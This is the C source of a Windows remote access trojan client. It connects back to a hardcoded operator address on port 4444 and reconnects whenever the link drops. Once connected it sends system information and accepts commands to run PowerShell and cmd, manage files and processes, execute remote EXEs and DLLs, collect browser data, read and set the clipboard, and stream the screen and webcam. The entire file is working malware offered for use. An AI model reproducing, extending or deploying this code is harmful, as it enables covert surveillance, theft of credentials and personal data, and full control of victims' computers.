#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <process.h>
#include "utils.h"
#include "sysinfo.h"
#include "shell.h"
#include "tasks.h"
#include "clipboard.h"
#include "filebrowser.h"
#include "rfe.h"
#include "screen.h"
#include "camera.h"
#include "browser.h"

#pragma comment(lib, "ws2_32.lib")

#define HOST "192.168.1.7"
#define PORT 4444
#define RECONNECT_DELAY 5000

SOCKET g_sock = INVALID_SOCKET;
HANDLE g_send_mutex = NULL;
HANDLE g_screen_stop = NULL;
HANDLE g_camera_stop = NULL;

typedef struct {
    char cmd[1024];
} CommandArgs;

void handle_command(void* arg) {
    CommandArgs* ca = (CommandArgs*)arg;
    char* cmd = ca->cmd;

    if (strcmp(cmd, "ping") == 0) {
        sock_send(g_sock, g_send_mutex, "pong");
    } else if (strncmp(cmd, "[msg] ", 6) == 0) {
        MessageBoxA(NULL, cmd + 6, "Message", MB_OK | MB_ICONINFORMATION | MB_SYSTEMMODAL);
        sock_send(g_sock, g_send_mutex, "ok");
    } else if (strncmp(cmd, "[exec_ps]", 9) == 0) {
        char* out = run_powershell(cmd + 9);
        char* saveptr;
        char* line = strtok_r(out, "\n", &saveptr);
        while (line) {
            char buf[4096];
            _snprintf(buf, sizeof(buf), "[ps_output]%s", line);
            sock_send(g_sock, g_send_mutex, buf);
            line = strtok_r(NULL, "\n", &saveptr);
        }
        free(out);
    } else if (strncmp(cmd, "[exec_cmd]", 10) == 0) {
        char* out = run_cmd(cmd + 10);
        char* saveptr;
        char* line = strtok_r(out, "\n", &saveptr);
        while (line) {
            char buf[4096];
            _snprintf(buf, sizeof(buf), "[cmd_output]%s", line);
            sock_send(g_sock, g_send_mutex, buf);
            line = strtok_r(NULL, "\n", &saveptr);
        }
        free(out);
    } else if (strcmp(cmd, "[screen_stop]") == 0) {
        if (g_screen_stop) SetEvent(g_screen_stop);
    } else if (strcmp(cmd, "[cam_stop]") == 0) {
        if (g_camera_stop) SetEvent(g_camera_stop);
    } else if (strcmp(cmd, "[tasklist]") == 0) {
        handle_tasklist(g_sock, g_send_mutex);
    } else if (strncmp(cmd, "[taskkill]", 10) == 0) {
        handle_taskkill(g_sock, g_send_mutex, cmd + 10);
    } else if (strncmp(cmd, "[ls]", 4) == 0) {
        handle_ls(g_sock, g_send_mutex, cmd + 4);
    } else if (strncmp(cmd, "[download]", 10) == 0) {
        handle_download(g_sock, g_send_mutex, cmd + 10);
    } else if (strncmp(cmd, "[delete]", 8) == 0) {
        handle_delete(g_sock, g_send_mutex, cmd + 8);
    } else if (strncmp(cmd, "[mkdir]", 7) == 0) {
        handle_mkdir(g_sock, g_send_mutex, cmd + 7);
    } else if (strncmp(cmd, "[upload]", 8) == 0) {
        handle_upload(g_sock, g_send_mutex, cmd + 8);
    } else if (strncmp(cmd, "[rename]", 8) == 0) {
        handle_rename(g_sock, g_send_mutex, cmd + 8);
    } else if (strncmp(cmd, "[rfe_exe]", 9) == 0) {
        handle_rfe_exe(g_sock, g_send_mutex, cmd + 9);
    } else if (strncmp(cmd, "[rfe_dll]", 9) == 0) {
        handle_rfe_dll(g_sock, g_send_mutex, cmd + 9);
    } else if (strncmp(cmd, "[browser_collect]", 17) == 0) {
        collect_browser_data(cmd + 17, g_sock, g_send_mutex);
    } else if (strcmp(cmd, "[clipboard_get]") == 0) {
        handle_clipboard_get(g_sock, g_send_mutex);
    } else if (strncmp(cmd, "[clipboard_set]", 15) == 0) {
        handle_clipboard_set(g_sock, g_send_mutex, cmd + 15);
    }

    free(ca);
}

// Updated thread helpers
typedef struct {
    int fps;
} StreamArgs;

void screen_thread(void* arg) {
    StreamArgs* sa = (StreamArgs*)arg;
    screen_stream_loop(g_sock, g_send_mutex, g_screen_stop, sa->fps);
    free(sa);
}

void camera_thread(void* arg) {
    StreamArgs* sa = (StreamArgs*)arg;
    camera_stream_loop(g_sock, g_send_mutex, g_camera_stop, sa->fps);
    free(sa);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    g_send_mutex = CreateMutex(NULL, FALSE, NULL);

    char* info = collect_sysinfo();

    while (1) {
        g_sock = socket(AF_INET, SOCK_STREAM, 0);
        struct sockaddr_in server;
        server.sin_family = AF_INET;
        server.sin_addr.s_addr = inet_addr(HOST);
        server.sin_port = htons(PORT);

        if (connect(g_sock, (struct sockaddr*)&server, sizeof(server)) < 0) {
            closesocket(g_sock);
            Sleep(RECONNECT_DELAY);
            continue;
        }

        char sysinfo_msg[1024];
        _snprintf(sysinfo_msg, sizeof(sysinfo_msg), "[sysinfo]%s\n", info);
        send(g_sock, sysinfo_msg, (int)strlen(sysinfo_msg), 0);

        char buf[1024];
        int n;
        while ((n = recv(g_sock, buf, sizeof(buf) - 1, 0)) > 0) {
            buf[n] = 0;
            char* saveptr;
            char* line = strtok_r(buf, "\n", &saveptr);
            while (line) {
                CommandArgs* ca = malloc(sizeof(CommandArgs));
                strncpy(ca->cmd, line, sizeof(ca->cmd) - 1);
                ca->cmd[sizeof(ca->cmd) - 1] = 0;

                if (strncmp(line, "[screen_start]", 14) == 0) {
                    int fps = atoi(line + 14);
                    if (g_screen_stop) {
                        SetEvent(g_screen_stop);
                        Sleep(100); // Give time for thread to see event
                        CloseHandle(g_screen_stop);
                    }
                    g_screen_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
                    StreamArgs* sa = malloc(sizeof(StreamArgs));
                    sa->fps = fps;
                    _beginthread(screen_thread, 0, sa);
                    free(ca);
                } else if (strncmp(line, "[cam_start]", 11) == 0) {
                    int fps = atoi(line + 11);
                    if (g_camera_stop) {
                        SetEvent(g_camera_stop);
                        Sleep(100);
                        CloseHandle(g_camera_stop);
                    }
                    g_camera_stop = CreateEvent(NULL, TRUE, FALSE, NULL);
                    StreamArgs* sa = malloc(sizeof(StreamArgs));
                    sa->fps = fps;
                    _beginthread(camera_thread, 0, sa);
                    free(ca);
                } else {
                    _beginthread(handle_command, 0, ca);
                }
                line = strtok_r(NULL, "\n", &saveptr);
            }
        }

        closesocket(g_sock);
        if (g_screen_stop) SetEvent(g_screen_stop);
        if (g_camera_stop) SetEvent(g_camera_stop);
        Sleep(RECONNECT_DELAY);
    }

    free(info);
    return 0;
}
